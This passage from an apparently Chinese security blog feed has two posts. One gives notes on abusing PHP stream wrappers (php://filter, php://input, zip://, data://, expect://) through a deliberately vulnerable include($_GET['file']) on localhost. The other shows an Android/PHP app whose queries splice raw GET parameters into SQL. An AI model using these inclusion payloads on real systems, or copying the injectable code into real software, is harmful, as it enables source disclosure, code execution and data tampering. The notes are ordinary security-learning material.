<h4 id="php-stderr"><a href="#php-stderr" class="headerlink" title="php://stderr"></a>php://stderr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $stderr = fopen( &apos;php://stderr&apos;, &apos;w&apos; );</div><div class="line">    echo $stderr.&quot;\n&quot;;</div><div class="line">    fwrite($stderr, &quot;uknow&quot; );</div><div class="line">    fclose($stderr);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/stderr.png" alt=""></p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>最常使用的一个伪协议，一般可以利用进行任意文件读取。 </p>
<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><table>
<thead>
<tr>
<th>名称</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td style="text-align:center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td>read=&lt;读链的筛选列表&gt;</td>
<td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。</td>
</tr>
<tr>
<td>write=&lt;写链的筛选列表&gt;</td>
<td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称，以管道符分隔。</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td style="text-align:center">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	include($_GET[&apos;file&apos;])</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/code/1.php?file=php://filter/read=convert.base64-encode/resource=./phpinfo.php</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/phpfilter1.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/phpfilter2.png" alt=""></p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<ul>
<li><p>allow_url_fopen ：off/on</p>
</li>
<li><p>allow_url_include：on</p>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/phpinput.png" alt=""></p>
<h2 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip://, bzip2://, zlib://协议"></a>zip://, bzip2://, zlib://协议</h2><p>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</p>
<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<ul>
<li><p>allow_url_fopen ：off/on</p>
</li>
<li><p>allow_url_include：off/on</p>
</li>
</ul>
<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>zip://archive.zip#dir/file.txt</p>
<p>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</p>
<p>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/code/1.php?file=zip://E:\phpStudy\WWW\code/1.zip%231.txt</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/zip.png" alt=""></p>
<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://协议必须双在on才能正常使用；</p>
<ul>
<li><p>allow_url_fopen ：on</p>
</li>
<li><p>allow_url_include：on</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/code/1.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</div><div class="line"></div><div class="line">http://127.0.0.1/code/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/data2.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/data1.png" alt=""></p>
<h2 id="glob-协议"><a href="#glob-协议" class="headerlink" title="glob://协议"></a>glob://协议</h2><p>glob:// — 查找匹配的文件路径模式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$it = new DirectoryIterator($_GET[&apos;file&apos;]);</div><div class="line">foreach($it as $f) &#123;</div><div class="line">    printf(&quot;%s&quot;, $f-&gt;getFilename());</div><div class="line">	echo&apos;&lt;/br&gt;&apos;; </div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/glob.png" alt=""></p>
<h2 id="expect-协议"><a href="#expect-协议" class="headerlink" title="expect://协议"></a>expect://协议</h2><p>expect:// — 处理交互式的流</p>
<p>该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装 » PECL 上的 » Expect 扩展。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">expect://command</div></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://php.net" target="_blank" rel="external">PHP</a><br><a href="http://www.freebuf.com/column/148886.html" target="_blank" rel="external">php伪协议实现命令执行的七种姿势</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Android App端与PHP Web端的简单数据交互实现</title>
    <link href="http://uknowsec.cn/posts/notes/Android-App%E7%AB%AF%E4%B8%8EPHP-Web%E7%AB%AF%E7%9A%84%E7%AE%80%E5%8D%95%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E5%AE%9E%E7%8E%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/Android-App端与PHP-Web端的简单数据交互实现.html</id>
    <published>2017-10-23T02:43:11.000Z</published>
    <updated>2017-10-25T09:39:55.306Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于学校科技立项的项目需要实现Android App端与PHP Web端的简单数据交互的实现，当前场景是Web端使用的是MySql数据库，Apache服务器和PHP语言编写的。数据交互的简单理解就是Android能向服务端进行数据获取，同时也能进行数据提交。</p>
<h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/webandorid%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt=""></p>
<h3 id="流程说明"><a href="#流程说明" class="headerlink" title="流程说明"></a>流程说明</h3><ul>
<li>Andorid Server端对MySql数据库进行简单的查询操作，并将查询数据结果转换为Json格式提供给Andorid利用OKhttp读取再解析Json展示到APP上；同时Andorid端利用OKhttp提交给Andorid Server端，由Server端对MySql数据库对提交数据的添加。</li>
<li>Apache Server端通过解析PHP源代码，对MySql数据库的增删查改显示在WebSite。</li>
</ul>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="Andorid-Server"><a href="#Andorid-Server" class="headerlink" title="Andorid Server"></a>Andorid Server</h3><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>get_all_found_items.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);/*设置php编码为utf-8*/</div><div class="line">/* </div><div class="line"> * Following code will list all the items </div><div class="line"> */  </div><div class="line">   </div><div class="line">// array for JSON response  </div><div class="line">$response = array();  </div><div class="line">   </div><div class="line">// include db connect class  </div><div class="line">require_once __DIR__ . &apos;/db_connect.php&apos;;  </div><div class="line">   </div><div class="line">// connecting to db  </div><div class="line">$db = new DB_CONNECT();  </div><div class="line">   </div><div class="line">// get all items from items table  </div><div class="line">$result = mysql_query(&quot;SELECT *FROM items WHERE type=&apos;1&apos;&quot;) or die(mysql_error());  </div><div class="line">// check for empty result  </div><div class="line">if (mysql_num_rows($result) &gt; 0) &#123;  </div><div class="line">    // looping through all results  </div><div class="line">    // items node  </div><div class="line">    $response[&quot;items&quot;] = array();  </div><div class="line">   </div><div class="line">    while ($row = mysql_fetch_array($result)) &#123;  </div><div class="line">        // temp user array  </div><div class="line">        $items = array();  </div><div class="line">        $items[&quot;what&quot;] = $row[&quot;what&quot;];  </div><div class="line">        $items[&quot;when&quot;] = $row[&quot;when&quot;];  </div><div class="line">        $items[&quot;where&quot;] = $row[&quot;where&quot;];  </div><div class="line">        $items[&quot;detail&quot;] = $row[&quot;detail&quot;];</div><div class="line">        $items[&quot;posttime&quot;] = $row[&quot;posttime&quot;];			</div><div class="line">		$resultcontcat = mysql_query(&quot;SELECT *FROM guests&quot;) or die(mysql_error()); </div><div class="line">		while ($row1 = mysql_fetch_array($resultcontcat)) &#123; </div><div class="line">			if ($row1[&quot;id&quot;] == $row[&quot;gid&quot;])&#123;</div><div class="line">				$items[&quot;contact&quot;] = $row1[&quot;contact&quot;];</div><div class="line">			&#125;</div><div class="line">			&#125;</div><div class="line">        // push single items into final response array  </div><div class="line">        array_push($response[&quot;items&quot;], $items);  </div><div class="line">    &#125;  </div><div class="line">    // success  </div><div class="line">    $response[&quot;success&quot;] = 1;  </div><div class="line">   </div><div class="line">    // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE); </div><div class="line">&#125; else &#123;  </div><div class="line">    // no items found  </div><div class="line">    $response[&quot;success&quot;] = 0;  </div><div class="line">    $response[&quot;message&quot;] = &quot;No items found&quot;;  </div><div class="line">   </div><div class="line">    // echo JSON  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>如以上PHP代码可知通过require_once()函数包含db_connect.php文件，执行数据库配置文件。定义数组\$response接收查询的数据结果，通过判断不同的情况赋值$response[“success”]，并返回到Web页面显示</p>
<p>PHP文件执行结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023110706.png" alt=""></p>
<p>JSON<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;items&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;手表&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-10-21 00:00:00&quot;,</div><div class="line">            &quot;where&quot;: &quot;北区宿舍楼#504&quot;,</div><div class="line">            &quot;detail&quot;: &quot;白色的手表，XX品牌&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 13:03:09&quot;,</div><div class="line">            &quot;contact&quot;: &quot;138123456&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;手机&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-10-04 00:00:00&quot;,</div><div class="line">            &quot;where&quot;: &quot;北区商店#111&quot;,</div><div class="line">            &quot;detail&quot;: &quot;iphone6s,土豪金&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 13:03:46&quot;,</div><div class="line">            &quot;contact&quot;: &quot;137123456&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;电脑&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-10-21 14:39:54&quot;,</div><div class="line">            &quot;where&quot;: &quot;图书馆#203&quot;,</div><div class="line">            &quot;detail&quot;: &quot;联想品牌笔记本&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 17:08:14&quot;,</div><div class="line">            &quot;contact&quot;: &quot;5670001&quot;</div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            &quot;what&quot;: &quot;细说PHP&quot;,</div><div class="line">            &quot;when&quot;: &quot;2017-09-21 13:03:46&quot;,</div><div class="line">            &quot;where&quot;: &quot;南馆#403&quot;,</div><div class="line">            &quot;detail&quot;: &quot;黑色封面，第二版《细说PHP》&quot;,</div><div class="line">            &quot;posttime&quot;: &quot;2017-10-21 17:36:53&quot;,</div><div class="line">            &quot;contact&quot;: &quot;63513641&quot;</div><div class="line">        &#125;</div><div class="line">    ],</div><div class="line">    &quot;success&quot;: 1</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="提交数据"><a href="#提交数据" class="headerlink" title="提交数据"></a>提交数据</h4><p>create_found_items.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);/*设置php编码为utf-8*/   </div><div class="line">/* </div><div class="line"> * Following code will create a new product row </div><div class="line"> * All product details are read from HTTP GET Request </div><div class="line"> */  </div><div class="line">   </div><div class="line">// array for JSON response  </div><div class="line">$response = array();  </div><div class="line">   </div><div class="line">// check for required fields  </div><div class="line">if (isset($_GET[&apos;what&apos;]) &amp;&amp; isset($_GET[&apos;when&apos;]) &amp;&amp; isset($_GET[&apos;where&apos;]) &amp;&amp; isset($_GET[&apos;detail&apos;])&amp;&amp; isset($_GET[&apos;contact&apos;])) &#123;  </div><div class="line">   </div><div class="line">    $what = $_GET[&apos;what&apos;];  </div><div class="line">    $when = $_GET[&apos;when&apos;];  </div><div class="line">    $where = $_GET[&apos;where&apos;];  </div><div class="line">    $detail = $_GET[&apos;detail&apos;]; </div><div class="line">    $contact = $_GET[&apos;contact&apos;];	</div><div class="line">	</div><div class="line">    // include db connect class  </div><div class="line">    require_once __DIR__ . &apos;/db_connect.php&apos;;  </div><div class="line">   </div><div class="line">    // connecting to db  </div><div class="line">    $db = new DB_CONNECT();  </div><div class="line">   </div><div class="line">    // mysql inserting a new row  </div><div class="line">	$result2 = mysql_query(&quot;INSERT INTO guests(contact) VALUES(&apos;$contact&apos;)&quot;);  </div><div class="line">	$gidresult = mysql_query(&quot;SELECT id FROM `guests` WHERE contact=&apos;$contact&apos;&quot;);	</div><div class="line">	while ($row = mysql_fetch_array($gidresult)) &#123; </div><div class="line">			$gid=$row[&apos;id&apos;];</div><div class="line">		&#125;</div><div class="line">    $result1 = mysql_query(&quot;INSERT INTO items(`what`, `when`, `where`, `type` ,`gid`, `detail`) VALUES(&apos;$what&apos;, &apos;$when&apos;, &apos;$where&apos;, &apos;1&apos;, &apos;$gid&apos;, &apos;$detail&apos;)&quot;);   </div><div class="line">   </div><div class="line">    // check if row inserted or not  </div><div class="line">    if ($result1 &amp;&amp; $result2) &#123;  </div><div class="line">        // successfully inserted into database  </div><div class="line">        $response[&quot;success&quot;] = 1;  </div><div class="line">        $response[&quot;message&quot;] = &quot;Items successfully created.&quot;;  </div><div class="line">   </div><div class="line">        // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </div><div class="line">    &#125; else &#123;  </div><div class="line">        // failed to insert row  </div><div class="line">        $response[&quot;success&quot;] = 0;  </div><div class="line">        $response[&quot;message&quot;] = &quot;Oops! An error occurred.&quot;;  </div><div class="line">   </div><div class="line">        // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </div><div class="line">    &#125;  </div><div class="line">&#125; else &#123;  </div><div class="line">    // required field is missing  </div><div class="line">    $response[&quot;success&quot;] = 0;  </div><div class="line">    $response[&quot;message&quot;] = &quot;Required field(s) is missing&quot;;  </div><div class="line">   </div><div class="line">    // echoing JSON response  </div><div class="line">    echo json_encode($response,JSON_UNESCAPED_UNICODE);   </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>判断GET请求的参数是否都存在，把获取的GET请求参数作为数据INSERT TO MySQL数据库。判断INSERT执行过程赋值\$response[“success”]对应相应的$response[“message”]，显示在Web页面。</p>
<p>执行结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171023111323_%E7%9C%8B%E5%9B%BE%E7%8E%8B.png" alt=""></p>
<h3 id="Andorid"><a href="#Andorid" class="headerlink" title="Andorid"></a>Andorid</h3><h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><p>核心代码 queryLosts()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">private void queryLosts() &#123;</div><div class="line">	losts.clear();</div><div class="line">	new Thread(new Runnable() &#123;</div><div class="line">		</div><div class="line">		@Override</div><div class="line">		public void run() &#123;</div><div class="line">			// TODO Auto-generated method stub</div><div class="line">			</div><div class="line">	        OkHttpClient okHttpClient = new OkHttpClient();</div><div class="line">	        String url = &quot;http://webSite/androidapi/get_all_lost_items.php&quot;;</div><div class="line">	        Request request = new Request.Builder()</div><div class="line">	                .url(url)</div><div class="line">	                .build();</div><div class="line">	        Call call = okHttpClient.newCall(request);</div><div class="line">	        try &#123;</div><div class="line">	            Response response = call.execute();</div><div class="line">	            String res = response.body().string();</div><div class="line">	            if (res != null &amp;&amp; !res.trim().equals(&quot;&quot;))&#123;</div><div class="line">	                JSONObject jsonObject = new JSONObject(res);</div><div class="line">	                if (jsonObject.getInt(&quot;success&quot;) == 1)&#123;</div><div class="line">	                    JSONArray jsonArray = jsonObject.getJSONArray(&quot;items&quot;);</div><div class="line">	                    for (int i = jsonArray.length() - 1;i &gt;= 0;i--)&#123;</div><div class="line">	                        JSONObject item = jsonArray.getJSONObject(i);</div><div class="line">	                        String what = null;</div><div class="line">	                        try &#123;</div><div class="line">	                            what = item.getString(&quot;what&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String when = null;</div><div class="line">	                        try&#123;</div><div class="line">	                            when = item.getString(&quot;when&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String where = null;</div><div class="line">	                        try&#123;</div><div class="line">	                            where = item.getString(&quot;where&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String detail = null;</div><div class="line">	                        try &#123;</div><div class="line">	                            detail = item.getString(&quot;detail&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        String contact = null;</div><div class="line">	                        try &#123;</div><div class="line">	                            contact = item.getString(&quot;contact&quot;);</div><div class="line">	                        &#125;catch (Exception e)&#123;</div><div class="line"></div><div class="line">	                        &#125;</div><div class="line">	                        Lost lost = new Lost();</div><div class="line">	                        lost.setTitle(what);</div><div class="line">	                        String des = &quot;地点：&quot; + (where == null?&quot;&quot;:where) +&quot;     &quot;+&quot;时间：&quot; + (when == null?&quot;&quot;:when)+&quot;\r&quot; + &quot;     &quot;+&quot;描述：&quot; + (detail == null?&quot;&quot;:detail);</div><div class="line">	                        lost.setDescribe(des);</div><div class="line">	                        lost.setPhone(contact == null?&quot;&quot;:contact);</div><div class="line">	                        losts.add(lost);</div><div class="line">	                    &#125;</div><div class="line">	                &#125;</div><div class="line">	            &#125;</div><div class="line">	        &#125; catch (Exception e) &#123;</div><div class="line">	            e.printStackTrace();</div><div class="line">	            showErrorView(0);</div><div class="line"></div><div class="line">	        &#125;</div><div class="line">	        if (losts == null || losts.size() == 0) &#123;</div><div class="line">	        	handler.sendEmptyMessage(1);</div><div class="line">	            return;</div><div class="line">	        &#125;</div><div class="line">	        if (losts.size() &gt; 0)&#123;</div><div class="line">	           handler.sendEmptyMessage(2);</div><div class="line">	        &#125;</div><div class="line">		&#125;</div><div class="line">	&#125;).start();</div></pre></td></tr></table></figure>
<p>利用Android网络框架OKhttp,OKhttp一个处理网络请求的开源项目,是安卓端最火热的轻量级框架.请求接口url地址，获取Json数据利用JSONObject对Json数据进行解析。</p>
<h4 id="提交数据-1"><a href="#提交数据-1" class="headerlink" title="提交数据"></a>提交数据</h4><p>核心代码 addLost()函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">public Handler handler = new Handler()&#123;</div><div class="line"></div><div class="line">	public void handleMessage(android.os.Message msg) &#123;</div><div class="line">		switch(msg.what)&#123;</div><div class="line">			case 1:</div><div class="line">				Toast.makeText(this,&quot;提交成功&quot;,Toast.LENGTH_LONG).show();</div><div class="line">				break;</div><div class="line">			case 2:</div><div class="line">				Toast.makeText(this,&quot;提交失败&quot;,Toast.LENGTH_LONG).show();</div><div class="line">				break;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">private void addLost()&#123;</div><div class="line">	OkHttpClient okHttpClient = new OkHttpClient();</div><div class="line">	String url =&quot;http://website/androidapi/create_lost_items.php?what=&quot;+title+&quot;&amp;when=&quot;+time+&quot;&amp;where=&quot;+place+&quot;&amp;detail=&quot;+describe+&quot;&amp;contact=&quot;+photo+&quot;&quot;;</div><div class="line">	Request request = new Request.Builder()</div><div class="line">			.url(url)</div><div class="line">			.build();</div><div class="line">	</div><div class="line"></div><div class="line">	try&#123;</div><div class="line">		Response response = okHttpClient.newCall(request).execute();</div><div class="line">		res = response.body().string();</div><div class="line">		handler.sendEmptyMessage(1);</div><div class="line">	&#125;catch (Exception e)</div><div class="line">	&#123;</div><div class="line">		e.printStackTrace();</div><div class="line">		handler.sendEmptyMessage(2);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样利用Okhttp,GET方式提交参数，try-catch获取异常，通过返回值给出一定的提交结果提示。</p>
<h2 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h2><h3 id="数据同步"><a href="#数据同步" class="headerlink" title="数据同步"></a>数据同步</h3><h4 id="Web端"><a href="#Web端" class="headerlink" title="Web端"></a>Web端</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023112834.png" alt=""></p>
<h4 id="Andorid端"><a href="#Andorid端" class="headerlink" title="Andorid端"></a>Andorid端</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171023112949.jpg" alt=""></p>
<h3 id="数据提交"><a href="#数据提交" class="headerlink" title="数据提交"></a>数据提交</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171023113352.jpg" alt=""></p>
<p>提交结果</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/Screenshot_2017-10-23-11-42-14-803_com.bmob.lostf.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171023114405.png" alt=""></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以上过程基本实现，项目基本上可以交差了。这个项目PHP部分主要是由自己在弄，也是边学边做。Android方面是另外一个同学主要负责，期间也求助过我实习时结交的朋友帮助。感谢所有付出与帮助的人。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP MVC开发框架学习笔记</title>
